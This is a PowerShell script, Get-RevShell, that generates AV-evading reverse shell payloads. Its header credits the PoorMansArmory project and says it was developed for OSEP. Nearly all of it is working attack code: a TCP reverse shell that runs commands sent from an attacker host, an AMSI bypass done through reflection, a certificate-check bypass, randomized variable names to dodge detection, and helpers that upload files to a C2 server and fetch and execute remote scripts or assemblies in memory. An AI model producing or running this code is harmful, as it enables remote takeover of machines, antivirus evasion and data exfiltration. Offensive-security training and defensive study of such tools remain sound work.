function Get-RevShell {
#.SYNOPSIS
# Robust and modular PowerShell RevShell generator meant to bypass AV.
# ARBITRARY VERSION NUMBER:  2.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to create custom reverse shells that 
# bypass Windows Defender as well as return error output on top of standard out.  By default, 
# the revshell is made for PowerShell 5.0+, but PowerShell 2.0 support is possible with a
# switch -- the only difference is a different method of calling objects and PowerShell 2.0
# not supporting the information output stream (e.g., Write-Host.
#
# Modular options include bypasses for AMSI as well as self-signed certificates to allow for 
# encrypted communication with an HTTPS C2.  Lastly, an option to preload the revshell with
# webclient helper functions to allow for seemless communication with the PoorMansArmory web
# server. These helpers include "upload", "download", and "import" with the server URL 
# hardcoded for minimalist utilization.  The "import" function currently supports PowerShell
# scripts and C# reflection.
#  
# Parameters:
#    Main Functionality
#      -IPAddress           -->  Attacker IP address
#      -Port                -->  Attacker listening port
#      -Base64              -->  Encode revshell output
#      -Help                -->  Return Get-Help information
#    
#    Modular Options 
#      -AmsiBypass          -->  Disable AMSI in current session (valid: 23 May 2023)
#      -HTTPSBypass         -->  Disable self-signed certificate checks
#      -PowerShell2Support  -->  Adjust RevShell to support PowerShell 2.0
#      -WebClientURL        -->  URL to point to webclient tools to (upload, download, import)
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        # Primary Parameters
        [String]$IPAddress,
        [int]   $Port,
        [switch]$Base64,
        [switch]$Help,

        # Optional Parameters
        [switch]$AmsiBypass,
        [switch]$HTTPSBypass,
        [switch]$PowerShell2Support,
        [string]$WebClientURL = 'http(s)://<ip_addr>'
    )


    # Return Get-Help Information
    if ($Help) { return Get-Help Get-RevShell }


    # Minimum Required Params
    if (!$IPAddress) { return (Write-Host 'Missing IP address.' -ForegroundColor Red) }
    if (!$Port)      { return (Write-Host 'Missing port.' -ForegroundColor Red)       }


    # Randomly generate 4 - 10 character variable names
    function Get-RandVar {
        $RanVar = '$'
        for ($i=0; $i -lt (Get-Random -Maximum 5 -Minimum 2); $i++) {
            $RanVar += Get-Random -InputObject ([char[]](([char]'a')..([char]'z')))
            $RanVar += Get-Random -InputObject ([char[]](([char]'A')..([char]'Z')))
        }
        return $RanVar
    }


    # Randomly Generate Variables in Payloads
    $Var1 = Get-RandVar # Client
    $Var2 = Get-RandVar # Stream
    $Var3 = Get-RandVar # Bytes
    $Var4 = Get-RandVar # LastError
    $Var5 = Get-RandVar # Data
    $Var6 = Get-RandVar # Return
    $Var7 = Get-RandVar # SendBack
    $Var8 = Get-RandVar # CertBypass
    $Var9 = Get-RandVar # AmsiBypass


    # Bypass Self-Signed Certificate Restriction (supports PowerShell and PowerShell Core)
    if ($HTTPSBypass) {

        $Bypass1 = @"
$Var8 = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type $Var8;
[SelfSignedCerts]::Bypass();`n
"@;
    }
    else { $Bypass1 = $NULL }


    # Bypass Code Execution Restrictions

    # Note:
    # This is weird, but this switch should be input prior to other switches if Windows Defender is enabled on the client
    # generating this payload.  Selecting the '-AmsiBypass' switch last will stop the RevShell generator from executing 
    # due to getting blocked by AV. Meanwhile, selecting '-AmsiBypass' before the other switches bypasses the AV block.
    # Worth looking into this later.

    if ($AmsiBypass) {

    $Bypass2 = @"
$Var9 = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}};
$Var9.SetValue(`$NULL,`$TRUE);`n
"@
    }
    else { $Bypass2 = $NULL }
    
    
    # Load WebClient Module into the Sessoin
    if ($WebClientURL -ne 'http(s)://<ip_addr>') {
        
        # Error Correction
        if (($WebClientURL -like "https:*") -and !$HTTPSBypass) {
            if (!$HTTPSBypass) { return (Write-Host 'HTTPS bypass required to communicate over SSL.' -ForegroundColor Red) }
        }

        $WebClient = @"
function download ([string]`$File){;
    if (!`$File) {return 'Error: Must input file.'};
    `$Filepath = (PWD).Path + "/`$File";
    (New-Object System.Net.WebClient).DownloadFile("$WebClientURL/d/`$File","`$Filepath");
    if (Test-Path -LiteralPath `$File) {return 'SUCCESSFUL DOWNLOAD'}
    else {return 'Error: Unsuccessful download.'};
};
function upload ([string]`$File){;
    if (!`$File) {return 'Error: Must input file.'};
    if (!(Test-Path -LiteralPath `$File)) { return 'Error: File not found.' };
    `$Filename = (Get-Item -LiteralPath `$File).BaseName;
    `$Filepath = (Get-Item -LiteralPath `$File).FullName;
    `$Response = (New-Object System.Net.WebClient).UploadFile("$WebClientURL/u/`$Filename","`$Filepath");
    `$FinalMessage = [System.Text.Encoding]::Ascii.GetString(`$Response);
    return `$FinalMessage;
};
function import ([string]`$File){;
    if (!`$File) {return 'Error: Must input file.'}; Try {
    if (`$File -like '*.exe') {
    [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("$WebClientURL/d/`$File"));
    return "REFLECTION SUCCESSFUL" } else {
    `$Contents = ((New-Object System.Net.WebClient).DownloadString("$WebClientURL/d/`$File"));
    if (!(`$Contents -like '*function global:*')) {`$Contents = `$Contents.Replace('function ','function global:')};
    Invoke-Expression `$Contents;
    return "IMPORT SUCCESSFUL"}} Catch {return 'Error: Import unsuccessful.'};
};`n
"@
    }
    else {$WebClient = $NULL }


    # Custom PowerShell 2.0+ Reverse Shell (Less likely to bypass AV)
    if ($PowerShell2Support) {

        $Revshell = @"
$Var1=New-Object System.Net.Sockets.TCPClient("$IPAddress",$Port);
$Var2=$Var1.GetStream();
[byte[]]$Var3=0..65535|%{0};
$Var4=`$Error[0];
while((`$i=$Var2.Read($Var3,0,$Var3.Length)) -ne 0){;
$Var5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Var3,0,`$i);
$Var6=(iex $Var5 2>&1 | Out-String );
if ($Var4 -ne `$Error[0]){$Var4=`$Error[0];$Var6+="$Var4``n"};
$Var6=$Var6+"PS "+(PWD).Path+"> ";
$Var7=([Text.Encoding]::ASCII).GetBytes($Var6);
$Var2.Write($Var7,0,$Var7.Length);
$Var2.Flush()};$Var2.Close();$Var1.Close();
"@
    }


    # Custom PowerShell 5.0+ Reverse Shell (Superior output)
    else {

        $Revshell = @"
$Var1=[System.Net.Sockets.TCPClient]::new("$IPAddress",$Port);
$Var2=$Var1.GetStream();
[byte[]]$Var3=0..65535|%{0};
$Var4=`$Error[0];
while((`$i=$Var2.Read($Var3,0,$Var3.Length)) -ne 0){;
$Var5=[System.Text.ASCIIEncoding]::new().GetString($Var3,0,`$i);
$Var6=(iex $Var5 *>&1 | Out-String);
if ($Var4 -ne `$Error[0]){$Var4=`$Error[0];$Var6+="$Var4``n"};
$Var6=$Var6+"PS "+(PWD).Path+"> ";
$Var7=([Text.Encoding]::ASCII).GetBytes($Var6);
$Var2.Write($Var7,0,$Var7.Length);
$Var2.Flush()};$Var2.Close();$Var1.Close();
"@
    }
    

    # Final Reverse Shell (HTTPS Bypass + AMSI Bypass + Reverse Shell)
    $Payload = $Bypass1 + $Bypass2 + $WebClient + $RevShell


    # Powershell -NoProfile -ExecutionPolicy Bypass -Command/-EncodedCommand {Payload}
    if ($Base64) { $FinalPayload = "powershell -nop -ex bypass -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Payload)) }
    else         { $FinalPayload = "powershell -nop -ex bypass -c {$Payload}" }


    return $FinalPayload
}